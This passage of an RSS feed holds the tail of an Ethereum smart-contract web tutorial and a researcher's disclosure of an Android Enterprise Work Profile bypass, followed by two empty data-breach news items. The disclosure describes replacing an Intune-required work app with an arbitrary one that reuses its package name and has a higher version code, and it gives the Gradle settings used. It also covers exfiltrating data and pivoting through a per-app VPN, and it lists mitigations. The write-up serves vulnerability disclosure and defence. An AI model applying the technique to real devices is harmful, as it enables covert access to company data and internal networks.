several links for different networks. The one we are looking for is Ethereum Sepolia.Step 9: Developing the Web InterfaceAt this point, we have most of the puzzle pieces:The only remaining part is to develop a web page to interact with the smart contract.Create a file named index.html. Paste the following code inside the file:Important: Replace the placeholders with your own values:YOUR_CONTRACT_ADDRESS_HERE → Smart contract addressYOUR_ABI_HERE → ABI JSON of your contractYOUR_INFURA_RPC_URL_HERE → Infura Sepolia RPC endpointThis simple web page allows users to click a button and fetch the message from the smart contract deployed on the blockchain.Step 10: Running the ProjectFinally, everything is ready to run our project.To avoid issues like Content Security Policies (CSP) when opening the HTML file directly in the browser, we’ll run a local server using Python.If you don’t have Python, you can also use alternatives like Live Server in VS Code, Node.js HTTP Server, or similar tools.Open a terminal in the project folder and run:python -m http.server 8000This will start a local web server on port 8000.Open your browser and go to:You should see your web page loaded.When you click the “Read Message” button, the page will fetch the message from the smart contract via the Infura RPC and display it on the screen.]]></content:encoded></item><item><title>Arbitrary App Installation on Intune Managed Android Enterprise BYOD in Work Profile</title><link>https://jgnr.ch/sites/android_enterprise.html</link><author>/u/Jessner10247</author><category>netsec</category><pubDate>Sat, 8 Nov 2025 13:57:20 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[ It's possible to install arbitrary apps in a provisioned Work Profile on a BYOD device with ADB and Android Studio after the patch of . 
			Due to a auto-install requirement in the Work Profile, which can be enforced via Intune, it is possible to convince the Play Store service (Finsky) to install an arbitrary app, with the same package name and a higher version number than the managed legit application. If a per-app VPN connection is configured via MS Tunnels and Defender application for the managed application, it is even possible to take over the VPN connection and have access to the internal systems.In June 2023, i had the chance to do some testing and research with Microsoft Intune and Android Enterprise in a (bring-your-own-device) BYOD scenario. Microsoft Intune is a cloud-based service that provides unified endpoint management, allowing organizations to manage and secure devices, applications, and data across various platforms, including Windows, macOS, iOS, and Android. Android Enterprise is a set of APIs and tools from Google that enables organizations to manage and secure Android devices for business use, allowing for the separation of work and personal data on a single device and providing granular control over apps and settings. The basic idea is to give the employees the opportunity to have business related apps with internal data on their phones, but in a secure way.During the analysis, we tested several vectors like if sharing data between private and work apps is enabled / possible, are screenshots enabled and stuff like that. We also noticed that some apps were required and auto downloaded due to company policies. Of course, this is all extremely dependant on the configuration of the respective policies pushed to the devices. Some not-so-interesting-compliance-checks-days later, we thought maybe it is possible to install arbitrary apps via ADB CLI. Since it is was private device (BYOD), the employee can activate the Developer Options options very easy.As we already knew, Android has multi user support and this is especially relevant for Work Profiles. Whenever a Work Profile is created on a device, an additional user is created with his own filesystem and relevant apps. This usually looks like this on a regular phone: main user is  and the Android Enterprise Work Profile user could be  (depending how many Work Profiles / other profiles were already created). This brings the advantage that the filesystem, system apps and everything relevant is absolutely isolated from one another. For useability and convenience reasons the Work Profile is then merged into the regular UI, as shown below: So we turned on the Developer settings and ADB on the phone tried to install an APK from our notebook via ADB CLI  and unfortunately it didnt work and was not installed. As we knew, the Work Profile has their own userid so we tried to install it via adb install --user 1 test.apk but this also did not work and we got a permission error.

			I can't really remember why (i think i got the hint from a stackoverflow article :D) but i then tried it to install a pretty basic self developed app with the package name  via Android Studio, with the configuration setting . Suprisingly, this worked. We had now an arbitrary app installed with our own package name in the private and the Work Profile. We added this finding to the report and wrapped it up.A couple of weeks later, in late August 2023, i wanted to come back to this problem, because i found it pretty weird that it wasn't possible to install arbitrary apps via ADB CLI, but it worked with Android Studio. So, i thought, maybe Android Studio sends some different ADB commands over USB or something. So, i set up an Intune trial tenant, created some policies according to the ones we saw in the engagement and created test users to login via the Company portal app on my test phone. I didn’t even get to the USB debugging part, because it did not work anymore.So, i debugged other things for several hours, tried several different apps and versions and could not figure out what was different than a couple of weeks ago. By suprise, i had a look at the Android Security Bulletin from July 2023 and saw a disclosed vulnerability which looked very suspiciously like a patch for our little party trick from June and my phone for testing was of course in auto-update mode.The patch had the following description:
[RESTRICT AUTOMERGE] Prevent installing apps in policy restricted work profile using ADB

If DISALLOW_DEBUGGING_FEATURES or DISALLOW_INSTALL_APPS restrictions are
set on a work profile, prevent side loading of APKs using ADB in the work profile.

			When i had closer look at the code, i wondered if it would be possible to install (update) an arbitrary app with the same package name as an already installed one. So i recreated the environment i had seen in June 2023, configured the Intune policies and added the  application to the required applications (automatic downloading and installing) of the group from my test user, because the seen environment from June 2023 also had this setting enabled. Some hours later and trying different things, i thought that it maybe should be possible to try and convince Android that my arbitrary app with the same package name as an already installed app, could be an update when the version number is higher than the actual one. 💡So i adjusted the  file of my sample app, with the assumption that the actual version name and version code of the application is  for example and the applicationId, namespace, packagename is known e.g. :
	[...]
	android {
	    namespace = "com.workday.workdroidapp"
	    compileSdk = 36

	    defaultConfig {
	        applicationId = "com.workday.workdroidapp"
	        minSdk = 31
	        targetSdk = 36
	        versionCode = 900000004
	        versionName = "9000000004.0"

	        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"

			When i checked that the setting to install for all users is still active and pressed the Debug button in Android Studio with the attached phone, i was immediatly greeted with the following notification:So i clicked  and immediatly saw the installation of my arbitrary app in the personal profile and the real Workday app, which we took the package name from for our arbitrary app, was deinstalled. I was a bit confused, because i actually thought after the error message it is not possible to update the legit app with my abitrary one and Android would just skip the installation to the Work Profile.I re-checked the company settings via Company Portal application on the phone and to my suprise, 1 minute later i saw a little notification from the Work Profile Play Store app (as i mentioned earlier, the work profile has their own set of system applications which are solely used for Work Profile stuff) that my application  has been successfully installed.At that point, i was totally confused. I repeated the steps several times, from uninstalling the work profile as a whole, reinstalling and onboarding via Company portal and then try to update the Workday app with my arbitrary one and it worked very reliable in 1-10min to replace the legit app with my arbitrary one, depending on the speed of which the policies and the missing required app (Workday) is checked and noticed on the device. I reread the patch from Android several times, and also checked the permission of the UserManager in the Work Profile, despite i just did a default configuration via Intune.So, I retested all of this in August 2025 with Android 16 (API Level 36) (Security Patch April 2025), as well as Android 13 (API Level 33) (Security Patch March 2024) and it still works. 

			
			  
			  
			  PoC with Android 13 (submitted to Android VRP with Security Patch August 2023):PoC with Android 16 (tested in August 2025 with Security Patch April 2025):So my idea why this whole chain worked was: When my arbitrary application is pushed to the device and to both users (private and work profile user) it gets installed for the private one, because there are no restrictions. For the Work Profile user, the APK gets pushed to the device into a temporary directory, then the check from the patch applies but fails because according to the usermanager object at least one of the flags DISALLOW_DEBUGGING_FEATURES or  is set for the Work Profile user and in parallel the legit app is deinstalled because it thinks it could be an update. At this point the legit app is deinstalled from the Work Profile. When then a recheck of the applied Intune policies via Company Portal is triggered, it also checks if all required apps are installed. When not, the Work Profile Play Store service (internal name Finsky) checks with Play Services online and also this temporary directory, compares the latest online version with the version in the temporary directory and if the temporary directory version is higher, then our arbitrary apps is installed. And most probably the Play Service does not check if the flags DISALLOW_DEBUGGING_FEATURES or  are set.So when i thought i had an idea why this happens and how it works, i was confident this could be a bypass for . So i opened an issue on the Google and Alphabet Vulnerability Reward Program (VRP) platform, documented everything and sent the bug report at end of August 2023.After a couple of weeks i got a response from Android VRP and with the answer that they consider this not as a vulnerability, the MDM needs to restrict this.In my opinion, the MDM does actually restrict this with the set flags (see pictures, left the private profile and right Work Profil) and the check also works, but there is most probably some sort of caching problem with the PlayStore service.Further Further Investigation - What could i do with my own app in a Work Profile?Besides the obvious, that usually sharing data between private and Work Profile is disabled, you have here a nice way to exfil data because you have now an application in the work context which you can share data to. Furthermore, there is also a setup i've seen in Intune with MS Tunnels, in which you can configure a per-app VPN. This means that a configured app on the device can connect via VPN to your network e.g. for an accounting application or internal employee directory. If you replace an application in the Work Profile with a configured per-app VPN setting with the party trick from above, it is also possible to use the VPN connection to the connected network with the arbitrary application.So of course, the prerequirements are very high, but if you're able to access someones BYOD device unlocked (Developer Settings need to be activated, otherwise you would need to know the device PIN/password to activate) you would be able to replace a legit business application with a malicous one for long-term access to company data. Additionally, if activated and if you are able to replace the correct one, you would also be able to pivot into the internal network via the per-app-VPN. To my current knowledge, the only setting that effectively mitigates this at the moment is disabling the automatic download and installation of apps (not configuring as ) in the Work Profile, but instead using available for enrolled devices setting. Other policies, such as disabling Developer Settings for all profiles or blocking installations from unknown sources, can be easily bypassed with proper timing. It it also questionable if employees would accept such a restriction on their private phone and in their private profile. Nonetheless the company tries to save money with not providing a dedicated work device and piggybacks the private ones.Let me know if you have additional ideas, then please ping me or let me know on X (https://x.com/joelgun)]]></content:encoded></item><item><title>NCCIA arrests man over massive data breach involving millions of Pakistanis</title><link>https://databreaches.net/2025/11/08/nccia-arrests-man-over-massive-data-breach-involving-millions-of-pakistanis/?pk_campaign=feed&amp;pk_kwd=nccia-arrests-man-over-massive-data-breach-involving-millions-of-pakistanis</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 8 Nov 2025 13:01:53 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Defense Contractors Are Silencing Their Cybersecurity Watchdogs</title><link>https://databreaches.net/2025/11/08/defense-contractors-are-silencing-their-cybersecurity-watchdogs/?pk_campaign=feed&amp;pk_kwd=defense-contractors-are-silencing-their-cybersecurity-watchdogs</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 8 Nov 2025 12:53:23 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item></channel></rss>
